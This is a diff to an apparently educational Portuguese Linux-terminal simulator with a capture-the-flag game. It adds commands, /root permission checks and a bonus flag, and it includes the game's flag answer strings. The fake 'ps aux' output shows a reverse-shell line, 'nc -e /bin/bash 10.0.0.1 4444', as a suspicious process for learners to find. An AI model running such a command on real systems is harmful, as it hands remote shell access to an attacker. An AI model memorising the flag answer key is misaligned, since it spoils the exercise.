@@ -39,6 +39,8 @@ const FS = {
   }
 };
 
+const BASE_FS = JSON.parse(JSON.stringify(FS));
+
 // ══════════════════════════════════════════════════════
 // ESTADO DO TERMINAL
 // ══════════════════════════════════════════════════════
@@ -68,6 +70,7 @@ const CTF = {
   score: 0,
   startTime: null,
   hintsUsed: 0,
+  bonusAttempted: false,
   flags: {
     flag1: {
       found: false, pts: 150, label: 'Copiar Relatorio',
@@ -139,6 +142,14 @@ const CTF = {
       next: 'Tente listar o diretorio /root → leia o arquivo secreto usando um comando com privilegios de superusuario.',
       hint: 'Consulte o menu lateral: use sudo antes do cat para executar o comando como root — sudo cat /root/arquivo.',
     },
+    flag11: {
+      found: false, pts: 500, label: 'Flag Bonus',
+      bonus: true,
+      what: 'Insira a flag secreta na tela final do CTF.',
+      why:  'Esta flag valida uma descoberta fora do caminho principal e recompensa exploracao avancada.',
+      next: 'Missao bonus concluida.',
+      hint: 'A flag bonus so pode ser submetida apos concluir as 10 flags principais.',
+    },
   },
   flagStrings: {
     'FLAG{CP_R3L4T0R10_PR3S3RV4D0_1}':      'flag1',
@@ -151,6 +162,7 @@ const CTF = {
     'FLAG{OCULTO_LS_A_3SCOND1DO_8888}':     'flag8',
     'FLAG{CR1PT0_D3C0D3R_H4CK3R_9999}':     'flag9',
     'FLAG{R00T_4CC3SS_SUP3RM4N_1010}':      'flag10',
+    'FLAG{Y0U_5H0ULD_N0T_B3_H3R3}':         'flag11',
   },
 };
 
@@ -166,6 +178,7 @@ const COMMANDS_DB = {
   cp:       { category:'Arquivos',    desc:'Copia arquivos e diretorios',           usage:'cp [opcoes] origem destino',       examples:['cp a.txt b.txt','cp -r pasta/ backup/'],        flags:{'-r':'recursivo','-p':'preserva atributos','-v':'verbose'},                                          tip:'Use cp -r para copiar diretorios inteiros.' },
   mv:       { category:'Arquivos',    desc:'Move ou renomeia arquivos',             usage:'mv [opcoes] origem destino',       examples:['mv old.txt new.txt','mv arquivo.txt /tmp/'],    flags:{'-i':'interativo','-v':'verbose'},                                                                    tip:'mv serve para mover e renomear arquivos.' },
   touch:    { category:'Arquivos',    desc:'Cria arquivos vazios ou atualiza data', usage:'touch arquivo',                   examples:['touch novo.txt','touch a.txt b.txt'],                                                                                                                         tip:'Cria arquivo vazio se nao existir, ou atualiza a data se existir.' },
+  file:     { category:'Arquivos',    desc:'Identifica o tipo de um arquivo',       usage:'file arquivo',                    examples:['file readme.txt','file script.sh','file /etc/hosts'],                                                                                                         tip:'Use file para descobrir se algo e texto, binario, script, imagem ou link.' },
   tar:      { category:'Arquivos',    desc:'Empacota e descompacta arquivos',       usage:'tar [opcoes] arquivo.tar [arqs]',  examples:['tar -czf backup.tar.gz pasta/','tar -xzf arquivo.tar.gz'], flags:{'-c':'criar','-x':'extrair','-z':'gzip','-f':'arquivo','-v':'verbose','-t':'listar'}, tip:'"czf" = Cria Zippado Arquivo | "xzf" = eXtrai Zippado Arquivo' },
   cat:      { category:'Texto',       desc:'Exibe conteudo de arquivos',            usage:'cat [opcoes] arquivo',             examples:['cat readme.txt','cat -n script.sh'],             flags:{'-n':'numerar linhas','-A':'chars especiais'},                                                        tip:'cat vem de "concatenate" — pode combinar multiplos arquivos.' },
   grep:     { category:'Texto',       desc:'Busca padroes em arquivos',             usage:'grep [opcoes] padrao [arquivo]',  examples:['grep "erro" log.txt','grep -i "linux" readme.txt','grep -n "func" script.sh'], flags:{'-i':'sem distincao','-r':'recursivo','-n':'no linha','-v':'inverter','-c':'contar'}, tip:'grep e uma das ferramentas mais poderosas do Linux.' },
@@ -176,6 +189,7 @@ const COMMANDS_DB = {
   wc:       { category:'Texto',       desc:'Conta linhas, palavras e caracteres',   usage:'wc [opcoes] [arquivo]',            examples:['wc arquivo.txt','wc -l log.txt','ls | wc -l'],  flags:{'-l':'linhas','-w':'palavras','-c':'bytes'},                                                         tip:'wc -l com pipes conta resultados de outros comandos.' },
   less:     { category:'Texto',       desc:'Visualiza arquivos com paginacao',      usage:'less [arquivo]',                  examples:['less readme.txt','less /var/log/syslog'],                                                                                                                     tip:'Teclas: q=sair | /=buscar | n=proximo | G=fim | g=inicio' },
   find:     { category:'Busca',       desc:'Busca arquivos no sistema',             usage:'find [caminho] [criterios]',       examples:['find . -name "*.txt"','find /home -type d','find . -mtime -7'], flags:{'-name':'por nome','-type':'f=arquivo d=dir','-mtime':'dias modificado'},      tip:'Combine com -exec para executar acoes nos arquivos encontrados.' },
+  which:    { category:'Busca',       desc:'Mostra o caminho de um executavel',      usage:'which comando',                   examples:['which bash','which python','which grep'],                                                                                                                     tip:'which ajuda a confirmar qual binario sera executado pelo PATH.' },
   chmod:    { category:'Permissoes',  desc:'Altera permissoes de arquivos',         usage:'chmod [modo] arquivo',             examples:['chmod 755 script.sh','chmod +x programa','chmod -R 644 docs/'],                                                                                             tip:'755=rwxr-xr-x | 644=rw-r--r-- | 777=rwxrwxrwx' },
   chown:    { category:'Permissoes',  desc:'Altera dono e grupo de arquivos',       usage:'chown [user:grupo] arquivo',       examples:['chown usuario arquivo.txt','chown -R www-data /var/www'],                                                                                                    tip:'Precisa de sudo para alterar dono de arquivos de outros usuarios.' },
   sudo:     { category:'Sistema',     desc:'Executa comandos como superusuario',    usage:'sudo [opcoes] comando',            examples:['sudo apt update','sudo systemctl restart nginx'],  flags:{'-u':'outro usuario','-s':'shell root','-l':'listar permissoes'},                                tip:'Use com responsabilidade — sudo da poderes administrativos totais.' },
@@ -188,9 +202,13 @@ const COMMANDS_DB = {
   free:     { category:'Sistema',     desc:'Mostra uso de memoria RAM',             usage:'free [opcoes]',                   examples:['free','free -h','free -m'],                       flags:{'-h':'legivel','-m':'megabytes','-g':'gigabytes'},                                                   tip:'free -h e o mais amigavel para ver RAM e SWAP disponiveis.' },
   env:      { category:'Sistema',     desc:'Lista variaveis de ambiente',           usage:'env',                             examples:['env','echo $HOME','echo $PATH'],                                                                                                                              tip:'Variaveis de ambiente configuram o comportamento de programas.' },
   whoami:   { category:'Sistema',     desc:'Mostra o usuario atual',                usage:'whoami',                          examples:['whoami'],                                                                                                                                                      tip:'Util para verificar com qual usuario voce esta executando comandos.' },
+  id:       { category:'Sistema',     desc:'Mostra UID, GID e grupos do usuario',   usage:'id [usuario]',                    examples:['id','id usuario'],                                                                                                                                            tip:'id e muito usado para diagnosticar permissoes e pertencimento a grupos.' },
+  hostname: { category:'Sistema',     desc:'Exibe o nome da maquina',               usage:'hostname [opcoes]',               examples:['hostname','hostname -I'],                         flags:{'-I':'enderecos IP'},                                                                                 tip:'hostname identifica rapidamente em qual servidor voce esta logado.' },
+  uptime:   { category:'Sistema',     desc:'Mostra tempo ligado e carga do sistema', usage:'uptime',                          examples:['uptime'],                                                                                                                                                      tip:'Load average alto por muito tempo indica pressao de CPU ou processos travados.' },
   uname:    { category:'Sistema',     desc:'Informacoes do sistema operacional',    usage:'uname [opcoes]',                  examples:['uname','uname -a','uname -r','uname -m'],         flags:{'-a':'todas as informacoes','-r':'versao do kernel','-m':'arquitetura'},                           tip:'uname -a e o mais usado para ver todas as informacoes do sistema.' },
   date:     { category:'Sistema',     desc:'Exibe ou configura data e hora',        usage:'date [formato]',                  examples:['date','date "+%d/%m/%Y"','date "+%H:%M:%S"'],                                                                                                                 tip:'Use + para formatar: %Y=ano %m=mes %d=dia %H=hora %M=minuto' },
   ifconfig: { category:'Rede',        desc:'Configura e exibe interfaces de rede',  usage:'ifconfig [interface]',            examples:['ifconfig','ifconfig eth0','ip addr show'],                                                                                                                    tip:'Em sistemas modernos, use "ip addr" (substituto do ifconfig).' },
+  ip:       { category:'Rede',        desc:'Mostra e configura rede no Linux moderno',usage:'ip [addr|route|link]',            examples:['ip addr','ip route','ip link show'],                                                                                                                          tip:'ip substitui ifconfig e route na maioria das distribuicoes atuais.' },
   ping:     { category:'Rede',        desc:'Testa conectividade de rede',           usage:'ping [opcoes] host',              examples:['ping google.com','ping -c 4 8.8.8.8'],            flags:{'-c':'no de pacotes','-i':'intervalo em segundos'},                                                 tip:'ping -c 4 envia apenas 4 pacotes e para automaticamente.' },
   ssh:      { category:'Rede',        desc:'Acesso seguro a servidores remotos',    usage:'ssh [usuario@]host',              examples:['ssh usuario@192.168.1.10','ssh -p 2222 servidor'],flags:{'-p':'porta','-i':'arquivo de chave','-v':'debug'},                                                  tip:'Configure ~/.ssh/config para atalhos de conexoes frequentes.' },
   scp:      { category:'Rede',        desc:'Copia arquivos via SSH',                usage:'scp [opcoes] origem destino',     examples:['scp arquivo.txt user@host:/tmp/','scp -r pasta/ user@host:~/'], flags:{'-r':'recursivo','-P':'porta'},                                                  tip:'Sintaxe: usuario@host:/caminho para especificar destino remoto.' },
@@ -201,18 +219,18 @@ const COMMANDS_DB = {
   help:     { category:'Ajuda',       desc:'Mostra ajuda sobre os comandos',        usage:'help [comando]',                  examples:['help','help ls','help grep'],                                                                                                                                  tip:'Digite help seguido de qualquer comando para ver detalhes.' },
   clear:    { category:'Terminal',    desc:'Limpa a tela do terminal',              usage:'clear',                           examples:['clear'],                                                                                                                                                       tip:'Atalho: Ctrl+L tambem limpa a tela.' },
   exit:     { category:'Terminal',    desc:'Sai do terminal ou shell atual',        usage:'exit [codigo]',                   examples:['exit','exit 0'],                                                                                                                                               tip:'exit 0 = sucesso | exit 1 ou qualquer outro = erro' },
-  ctf:      { category:'Terminal',    desc:'Modo Jogo -- Capture The Flag',         usage:'ctf [start|status|hint|reset|stop]', examples:['ctf start','ctf status','ctf hint','ctf stop'],                                                                                                          tip:'Encontre 8 flags escondidas no sistema usando todos os comandos Linux!' },
+  ctf:      { category:'Terminal',    desc:'Modo Jogo -- Capture The Flag',         usage:'ctf [start|status|hint|reset|stop]', examples:['ctf start','ctf status','ctf hint','ctf stop'],                                                                                                          tip:'Encontre 10 flags escondidas no sistema usando todos os comandos Linux!' },
 };
 
 const CATEGORIES = {
   'Navegacao':   { icon:'<>', cmds:['ls','cd','pwd'] },
-  'Arquivos':    { icon:'[]', cmds:['mkdir','rm','cp','mv','touch','tar'] },
+  'Arquivos':    { icon:'[]', cmds:['mkdir','rm','cp','mv','touch','file','tar'] },
   'Texto':       { icon:'##', cmds:['cat','grep','echo','head','tail','sort','wc','less'] },
-  'Busca':       { icon:'??', cmds:['find'] },
+  'Busca':       { icon:'??', cmds:['find','which'] },
   'Permissoes':  { icon:'**', cmds:['chmod','chown'] },
   'Processos':   { icon:'%%', cmds:['ps','kill','top'] },
-  'Sistema':     { icon:'$$', cmds:['sudo','apt','df','du','free','env','whoami','uname','date'] },
-  'Rede':        { icon:'@@', cmds:['ifconfig','ping','ssh','scp','wget','curl'] },
+  'Sistema':     { icon:'$$', cmds:['sudo','apt','df','du','free','env','whoami','id','hostname','uptime','uname','date'] },
+  'Rede':        { icon:'@@', cmds:['ifconfig','ip','ping','ssh','scp','wget','curl'] },
   'Ajuda':       { icon:';;', cmds:['man','history','help'] },
   'Terminal':    { icon:'::', cmds:['clear','exit','ctf'] },
 };
@@ -262,6 +280,7 @@ function getParentAndNode(path) {
 }
 
 function dirName(path) { return path.split('/').filter(Boolean).pop() || '/'; }
+function cloneNode(node) { return JSON.parse(JSON.stringify(node)); }
 function listDir(path) {
   const node = getNode(path);
   if (!node || node.type !== 'dir') return null;
@@ -294,6 +313,14 @@ function escapeHtml(s) {
   return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
 }
 
+function formatOutputLine(line) {
+  const text = String(line);
+  if (/^Proxima missao:/i.test(text) || /^Pr[oó]xima miss[aã]o:/i.test(text)) {
+    return `<span class="next-mission">${text}</span>`;
+  }
+  return text;
+}
+
 function print(text, cls) {
   cls = cls || 'output';
   const lines = String(text).split('\n');
@@ -301,7 +328,7 @@ function print(text, cls) {
     const el = document.createElement('div');
     el.className = 'output-line ' + cls;
     if (line === '') { el.classList.add('blank'); }
-    else { el.innerHTML = line; }
+    else { el.innerHTML = formatOutputLine(line); }
     outputEl.appendChild(el);
   }
   outputEl.scrollTop = outputEl.scrollHeight;
@@ -367,11 +394,15 @@ function parseCommand(input) {
 // ══════════════════════════════════════════════════════
 // COMANDOS
 // ══════════════════════════════════════════════════════
-function cmdLs(flags, args) {
+function cmdLs(flags, args, elevated) {
   const path = args[0] ? resolvePath(state.cwd, args[0]) : state.cwd;
+  if (path.startsWith('/root') && !elevated) {
+    print(`ls: nao e possivel abrir diretorio '${args[0] || path}': Permissao negada`, 'error');
+    return false;
+  }
   const node = getNode(path);
-  if (!node) { print(`ls: nao e possivel acessar '${args[0]}': Arquivo ou diretorio nao encontrado`, 'error'); return; }
-  if (node.type === 'file') { print(args[0], 'output'); return; }
+  if (!node) { print(`ls: nao e possivel acessar '${args[0]}': Arquivo ou diretorio nao encontrado`, 'error'); return false; }
+  if (node.type === 'file') { print(args[0], 'output'); return true; }
   const showAll  = flags.some(f => f.includes('a'));
   const longForm = flags.some(f => f.includes('l'));
   const humanR   = flags.some(f => f.includes('h'));
@@ -393,7 +424,7 @@ function cmdLs(flags, args) {
       }).join('  ');
       print(row, 'output');
     }
-    return;
+    return true;
   }
   print(`total ${entries.length * 4}`, 'output-dim');
   const now = new Date();
@@ -408,6 +439,7 @@ function cmdLs(flags, args) {
       : `<span class="hl-value">${escapeHtml(e.name)}</span>`;
     print(`<span class="output-dim">${perms}  ${isDir?2:1} ${state.user} ${state.user} ${String(size).padStart(5)} ${months[now.getMonth()]} ${String(now.getDate()).padStart(2,' ')} ${time} </span>${nameStr}`, 'output');
   }
+  return true;
 }
 
 function cmdCd(args) {
@@ -423,23 +455,37 @@ function cmdCd(args) {
 }
 
 function cmdMkdir(flags, args) {
-  if (!args.length) { print('mkdir: informe o nome do diretorio', 'error'); return; }
+  if (!args.length) { print('mkdir: informe o nome do diretorio', 'error'); return false; }
   const parents = flags.includes('-p');
+  let ok = true;
   for (const arg of args) {
+    let argOk = true;
     const parts = resolvePath(state.cwd, arg).split('/').filter(Boolean);
     let cur = FS['/'];
     for (let i = 0; i < parts.length - 1; i++) {
+      if (!cur || cur.type !== 'dir' || !cur.children) {
+        print(`mkdir: nao e possivel criar '${arg}': Nao e um diretorio`, 'error');
+        ok = false; argOk = false;
+        break;
+      }
       if (!cur.children[parts[i]]) {
-        if (!parents) { print(`mkdir: nao e possivel criar '${arg}': Diretorio pai nao encontrado`, 'error'); return; }
+        if (!parents) { print(`mkdir: nao e possivel criar '${arg}': Diretorio pai nao encontrado`, 'error'); return false; }
         cur.children[parts[i]] = { type:'dir', children:{} };
       }
       cur = cur.children[parts[i]];
     }
+    if (!argOk) continue;
+    if (!cur || cur.type !== 'dir' || !cur.children) {
+      print(`mkdir: nao e possivel criar '${arg}': Nao e um diretorio`, 'error');
+      ok = false;
+      continue;
+    }
     const name = parts[parts.length-1];
-    if (cur.children[name]) { print(`mkdir: nao e possivel criar '${arg}': O arquivo ja existe`, 'error'); continue; }
+    if (cur.children[name]) { print(`mkdir: nao e possivel criar '${arg}': O arquivo ja existe`, 'error'); ok = false; continue; }
     cur.children[name] = { type:'dir', children:{} };
     if (flags.includes('-v')) print(`mkdir: criado diretorio '${arg}'`, 'success');
   }
+  return ok;
 }
 
 function cmdTouch(args) {
@@ -447,6 +493,22 @@ function cmdTouch(args) {
     const { parent, name } = getParentAndNode(resolvePath(state.cwd, arg));
     if (!parent) { print(`touch: nao e possivel acessar '${arg}': Diretorio nao encontrado`, 'error'); continue; }
     if (!parent.children[name]) parent.children[name] = { type:'file', content:'' };
+  }
+}
+
+function cmdFile(args) {
+  if (!args.length) { print('file: informe um arquivo', 'error'); return; }
+  for (const arg of args) {
+    const node = getNode(resolvePath(state.cwd, arg));
+    if (!node) { print(`${arg}: cannot open (No such file or directory)`, 'error'); continue; }
+    if (node.type === 'dir') { print(`${arg}: directory`, 'output'); continue; }
+    const content = node.content || '';
+    let type = 'ASCII text';
+    if (arg.endsWith('.sh') || content.startsWith('#!/bin/bash')) type = 'Bourne-Again shell script, ASCII text executable';
+    else if (arg.endsWith('.md')) type = 'Markdown document, ASCII text';
+    else if (arg.endsWith('.enc')) type = 'data';
+    else if (arg.endsWith('.html')) type = 'HTML document, ASCII text';
+    print(`${arg}: ${type}`, 'output');
   }
 }
 
@@ -463,44 +525,61 @@ function cmdRm(flags, args) {
 }
 
 function cmdCp(flags, args) {
-  if (args.length < 2) { print('cp: informe origem e destino', 'error'); return; }
+  if (args.length < 2) { print('cp: informe origem e destino', 'error'); return false; }
   const srcNode = getNode(resolvePath(state.cwd, args[0]));
-  if (!srcNode) { print(`cp: '${args[0]}': Nao encontrado`, 'error'); return; }
+  if (!srcNode) { print(`cp: '${args[0]}': Nao encontrado`, 'error'); return false; }
+  if (srcNode.type === 'dir' && !flags.some(f => f.includes('r') || f.includes('R'))) {
+    print(`cp: -r nao especificado; omitindo diretorio '${args[0]}'`, 'error');
+    return false;
+  }
   const dst = resolvePath(state.cwd, args[1]);
   const dstNode = getNode(dst);
   const { parent: dp, name: dn } = getParentAndNode(dst);
   if (dstNode && dstNode.type === 'dir') dstNode.children[dirName(resolvePath(state.cwd,args[0]))] = JSON.parse(JSON.stringify(srcNode));
-  else if (dp) dp.children[dn] = JSON.parse(JSON.stringify(srcNode));
+  else if (dp && dp.type === 'dir') dp.children[dn] = JSON.parse(JSON.stringify(srcNode));
+  else { print(`cp: nao e possivel criar '${args[1]}': Diretorio de destino nao encontrado`, 'error'); return false; }
   if (flags.includes('-v')) print(`'${args[0]}' -> '${args[1]}'`, 'output-dim');
+  return true;
 }
 
 function cmdMv(flags, args) {
-  if (args.length < 2) { print('mv: informe origem e destino', 'error'); return; }
+  if (args.length < 2) { print('mv: informe origem e destino', 'error'); return false; }
   const src = resolvePath(state.cwd, args[0]);
   const dst = resolvePath(state.cwd, args[1]);
   const { parent: sp, name: sn } = getParentAndNode(src);
-  if (!sp || !sp.children[sn]) { print(`mv: '${args[0]}': Nao encontrado`, 'error'); return; }
+  if (!sp || !sp.children[sn]) { print(`mv: '${args[0]}': Nao encontrado`, 'error'); return false; }
   const srcNode = sp.children[sn];
   const dstNode = getNode(dst);
   const { parent: dp, name: dn } = getParentAndNode(dst);
   if (dstNode && dstNode.type === 'dir') dstNode.children[sn] = srcNode;
-  else if (dp) dp.children[dn] = srcNode;
+  else if (dp && dp.type === 'dir') dp.children[dn] = srcNode;
+  else { print(`mv: nao e possivel mover para '${args[1]}': Diretorio de destino nao encontrado`, 'error'); return false; }
   delete sp.children[sn];
   if (flags.includes('-v')) print(`'${args[0]}' -> '${args[1]}'`, 'output-dim');
   if (state.cwd === src) { state.cwd = dst; updatePrompt(); }
+  return true;
 }
 
-function cmdCat(flags, args) {
-  if (!args.length) { print('cat: informe um arquivo', 'error'); return; }
+function cmdCat(flags, args, elevated) {
+  if (!args.length) { print('cat: informe um arquivo', 'error'); return false; }
+  let ok = true;
   for (const arg of args) {
-    const node = getNode(resolvePath(state.cwd, arg));
-    if (!node) { print(`cat: ${arg}: Arquivo ou diretorio nao encontrado`, 'error'); continue; }
-    if (node.type === 'dir') { print(`cat: ${arg}: E um diretorio`, 'error'); continue; }
+    const path = resolvePath(state.cwd, arg);
+    const node = getNode(path);
+    if (!node) { print(`cat: ${arg}: Arquivo ou diretorio nao encontrado`, 'error'); ok = false; continue; }
+    if (node.type === 'dir') { print(`cat: ${arg}: E um diretorio`, 'error'); ok = false; continue; }
+    if (path.startsWith('/root') && !elevated) {
+      print(`cat: ${arg}: Permissao negada`, 'error');
+      ok = false;
+      continue;
+    }
+    if (!canRevealCTFNode(node, path)) { ok = false; continue; }
     node.content.split('\n').forEach((line, i) => {
       const prefix = flags.includes('-n') ? `<span class="output-dim">${String(i+1).padStart(6)} </span>` : '';
       print(prefix + escapeHtml(line), 'output');
     });
   }
+  return ok;
 }
 
 function cmdEcho(flags, args) {
@@ -517,9 +596,12 @@ function cmdGrep(flags, args) {
   try { regex = new RegExp(pattern, ci ? 'i' : ''); } catch { print(`grep: expressao regular invalida: ${pattern}`, 'error'); return; }
   if (!files.length) { print('grep: informe um arquivo', 'error'); return; }
   for (const arg of files) {
-    const node = getNode(resolvePath(state.cwd, arg));
+    const path = resolvePath(state.cwd, arg);
+    const node = getNode(path);
     if (!node) { print(`grep: ${arg}: Nao encontrado`, 'error'); continue; }
     if (node.type === 'dir') { print(`grep: ${arg}: E um diretorio`, 'error'); continue; }
+    if (path.startsWith('/root')) { print(`grep: ${arg}: Permissao negada`, 'error'); continue; }
+    if (!canRevealCTFNode(node, path)) continue;
     let cnt = 0;
     node.content.split('\n').forEach((line, i) => {
       const match = regex.test(line);
@@ -537,6 +619,7 @@ function cmdGrep(flags, args) {
 
 function cmdFind(flags, args) {
   const startPath = resolvePath(state.cwd, args[0] || '.');
+  if (startPath.startsWith('/root')) { print(`find: '${args[0] || startPath}': Permissao negada`, 'error'); return; }
   const ni = args.indexOf('-name'), ti = args.indexOf('-type');
   const namePat = ni >= 0 ? args[ni+1] : null;
   const typeF   = ti >= 0 ? args[ti+1] : null;
@@ -547,9 +630,21 @@ function cmdFind(flags, args) {
     if (namePat) { const rx = new RegExp('^' + namePat.replace(/\*/g,'.*').replace(/\?/g,'.') + '$'); show = rx.test(name); }
     if (typeF) show = show && ((typeF==='f'&&node.type==='file')||(typeF==='d'&&node.type==='dir'));
     if (show && path !== startPath) print(path, 'output');
-    if (node.type === 'dir') Object.entries(node.children).forEach(([cn,cv]) => search(path==='/'?'/'+cn:path+'/'+cn, cv));
+    if (node.type === 'dir') Object.entries(node.children).forEach(([cn,cv]) => {
+      const childPath = path==='/'?'/'+cn:path+'/'+cn;
+      if (childPath.startsWith('/root')) return;
+      search(childPath, cv);
+    });
   }
   search(startPath, getNode(startPath));
+}
+
+function cmdWhich(args) {
+  if (!args.length) { print('which: informe um comando', 'error'); return; }
+  args.forEach(cmd => {
+    if (COMMANDS_DB[cmd] || ['bash','sh','python','node','vim'].includes(cmd)) print(`/usr/bin/${cmd}`, 'output');
+    else print(`which: no ${cmd} in (${state.env.PATH})`, 'error');
+  });
 }
 
 function cmdChmod(args) {
@@ -564,13 +659,16 @@ function cmdChown(args) {
   print(`Dono de '${args[1]}' alterado para '${args[0]}'`, 'success');
 }
 
-function cmdPs(flags) {
-  const full = flags.some(f => /[ae]/.test(f.replace('-','')));
+function cmdPs(flags, args) {
+  const usedDashAux = flags.some(f => f === '-aux' || f === '-uxa' || f === '-xua');
+  const full = args.includes('aux') || flags.some(f => /[ae]/.test(f.replace('-','')) && !usedDashAux);
   print('  PID TTY          TIME CMD', 'output-dim');
+  if (usedDashAux) print('ps: use "ps aux" sem hifen para listar todos os processos nesta missao.', 'warning');
   [['    1','?    ','00:00:02','systemd'],[' 1337','pts/0','00:00:00','bash'],[' 2048','?    ','00:01:23','sshd'],[' 3141','?    ','00:00:05','cron']].forEach(p => print(p.join('  '), 'output'));
   if (full) {
     [['  4096','pts/1','00:00:00','ps'],[' 9999','?    ','00:02:11','nginx: master'],['10000','?    ','00:00:44','nginx: worker']].forEach(p => print(p.join('  '), 'output'));
-    if (CTF.active && !CTF.flags.flag3.found) {
+    if (CTF.active && !CTF.flags.flag5.found) {
+      if (!canCaptureCTFKey('flag5')) { warnCTFOutOfOrder('flag5'); return; }
       print(' 6660 ?    00:00:00 .bash_hidden  <span style="color:var(--red)">[SUSPEITO]</span>', 'error');
       print(' 6661 ?    00:00:01 nc -e /bin/bash 10.0.0.1 4444  <span style="color:var(--red)">[SUSPEITO]</span>', 'error');
       printBlank();
@@ -579,6 +677,7 @@ function cmdPs(flags) {
       print('║  FLAG{PR0C3SS0_SUSP3IT0_PS_AUX_5}     ║', 'success');
       print('╚══════════════════════════════════════════╝', 'success');
       print('Flag 5/10 — [Processos]', 'success');
+      print('Proxima missao: leia /etc/hosts para investigar entradas de rede suspeitas', 'info');
       setTimeout(() => captureFlag('flag5'), 150);
     }
   }
@@ -629,27 +728,60 @@ function cmdTar(flags, args) {
   else print('tar: informe -c (criar), -x (extrair), -t (listar)', 'error');
 }
 
-function cmdHead(flags, args) {
-  const n = parseInt((flags.find(f=>f.startsWith('-n'))||'-10').slice(2)) || 10;
+function optionValue(raw, opt, fallback) {
+  const compact = raw.find(t => t.startsWith(opt) && t.length > opt.length);
+  if (compact) return compact.slice(opt.length);
+  const idx = raw.indexOf(opt);
+  return idx >= 0 ? raw[idx + 1] : fallback;
+}
+
+function argsWithoutOptionValue(raw, opt) {
+  const out = [];
+  for (let i = 0; i < raw.length; i++) {
+    const t = raw[i];
+    if (t === opt) { i++; continue; }
+    if (t.startsWith(opt) && t.length > opt.length) continue;
+    if (t.startsWith('-')) continue;
+    out.push(t);
+  }
+  return out;
+}
+
+function cmdHead(flags, args, raw) {
+  const n = parseInt(optionValue(raw, '-n', '10'), 10) || 10;
+  args = argsWithoutOptionValue(raw, '-n');
   if (!args.length) { print('head: informe um arquivo','error'); return; }
-  const node = getNode(resolvePath(state.cwd, args[0]));
+  const path = resolvePath(state.cwd, args[0]);
+  const node = getNode(path);
   if (!node) { print(`head: '${args[0]}': Nao encontrado`,'error'); return; }
+  if (node.type === 'dir') { print(`head: '${args[0]}': E um diretorio`,'error'); return; }
+  if (path.startsWith('/root')) { print(`head: '${args[0]}': Permissao negada`,'error'); return; }
+  if (!canRevealCTFNode(node, path)) return;
   node.content.split('\n').slice(0,n).forEach(l=>print(escapeHtml(l),'output'));
 }
 
-function cmdTail(flags, args) {
-  const n = parseInt((flags.find(f=>f.startsWith('-n'))||'-10').slice(2)) || 10;
+function cmdTail(flags, args, raw) {
+  const n = parseInt(optionValue(raw, '-n', '10'), 10) || 10;
+  args = argsWithoutOptionValue(raw, '-n');
   if (!args.length) { print('tail: informe um arquivo','error'); return; }
-  const node = getNode(resolvePath(state.cwd, args[0]));
+  const path = resolvePath(state.cwd, args[0]);
+  const node = getNode(path);
   if (!node) { print(`tail: '${args[0]}': Nao encontrado`,'error'); return; }
+  if (node.type === 'dir') { print(`tail: '${args[0]}': E um diretorio`,'error'); return; }
+  if (path.startsWith('/root')) { print(`tail: '${args[0]}': Permissao negada`,'error'); return; }
+  if (!canRevealCTFNode(node, path)) return;
   node.content.split('\n').slice(-n).forEach(l=>print(escapeHtml(l),'output'));
   if (flags.includes('-f')) print(`<span class="output-dim">tail: seguindo '${args[0]}' (simulacao)</span>`,'output');
 }
 
 function cmdSort(flags, args) {
   if (!args.length) { print('sort: informe um arquivo','error'); return; }
-  const node = getNode(resolvePath(state.cwd, args[0]));
+  const path = resolvePath(state.cwd, args[0]);
+  const node = getNode(path);
   if (!node) { print(`sort: '${args[0]}': Nao encontrado`,'error'); return; }
+  if (node.type === 'dir') { print(`sort: '${args[0]}': E um diretorio`,'error'); return; }
+  if (path.startsWith('/root')) { print(`sort: '${args[0]}': Permissao negada`,'error'); return; }
+  if (!canRevealCTFNode(node, path)) return;
   let lines = node.content.split('\n').filter(Boolean);
   if (flags.includes('-n')) lines.sort((a,b)=>parseFloat(a)-parseFloat(b)); else lines.sort();
   if (flags.includes('-r')) lines.reverse();
@@ -659,8 +791,11 @@ function cmdSort(flags, args) {
 
 function cmdWc(flags, args) {
   if (!args.length) { print('wc: informe um arquivo','error'); return; }
-  const node = getNode(resolvePath(state.cwd, args[0]));
+  const path = resolvePath(state.cwd, args[0]);
+  const node = getNode(path);
   if (!node) { print(`wc: '${args[0]}': Nao encontrado`,'error'); return; }
+  if (node.type === 'dir') { print(`wc: '${args[0]}': E um diretorio`,'error'); return; }
+  if (path.startsWith('/root')) { print(`wc: '${args[0]}': Permissao negada`,'error'); return; }
   const c=node.content, lns=c.split('\n').length, wds=c.trim().split(/\s+/).length, bts=new Blob([c]).size;
   if (flags.includes('-l')) { print(`${String(lns).padStart(7)} ${args[0]}`,'output'); return; }
   if (flags.includes('-w')) { print(`${String(wds).padStart(7)} ${args[0]}`,'output'); return; }
@@ -670,8 +805,12 @@ function cmdWc(flags, args) {
 
 function cmdLess(args) {
   if (!args.length) { print('less: informe um arquivo','error'); return; }
-  const node = getNode(resolvePath(state.cwd, args[0]));
+  const path = resolvePath(state.cwd, args[0]);
+  const node = getNode(path);
   if (!node) { print(`less: '${args[0]}': Nao encontrado`,'error'); return; }
+  if (node.type === 'dir') { print(`less: '${args[0]}': E um diretorio`,'error'); return; }
+  if (path.startsWith('/root')) { print(`less: '${args[0]}': Permissao negada`,'error'); return; }
+  if (!canRevealCTFNode(node, path)) return;
   node.content.split('\n').slice(0,20).forEach((l,i)=>print(`<span class="output-dim">${String(i+1).padStart(3)} </span>${escapeHtml(l)}`,'output'));
   print('<span class="output-dim">Simulacao: use cat para ver tudo</span>','output-dim');
 }
@@ -731,6 +870,18 @@ function cmdHelp(args) {
 
 function cmdEnv() { Object.entries(state.env).forEach(([k,v])=>print(`<span class="hl-cmd">${k}</span>=<span class="hl-value">${escapeHtml(v)}</span>`,'output')); }
 function cmdWhoami() { print(state.user,'output'); }
+function cmdId(args) {
+  const user = args[0] || state.user;
+  print(`uid=1000(${user}) gid=1000(${user}) grupos=1000(${user}),27(sudo),100(users)`, 'output');
+}
+function cmdHostname(flags) {
+  if (flags.includes('-I')) print('192.168.1.100 10.0.0.15', 'output');
+  else print(state.hostname, 'output');
+}
+function cmdUptime() {
+  const now = new Date().toLocaleTimeString('pt-BR', { hour12:false });
+  print(`${now} up 3 days,  4:17,  1 user,  load average: 0.12, 0.08, 0.05`, 'output');
+}
 function cmdUname(flags) {
   if (flags.includes('-a')) print(`Linux ${state.hostname} 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux`,'output');
   else if (flags.includes('-r')) print('5.15.0-91-generic','output');
@@ -744,10 +895,12 @@ function cmdDate(raw) {
   } else print(now.toLocaleString('pt-BR'),'output');
 }
 function cmdSudo(flags, args) {
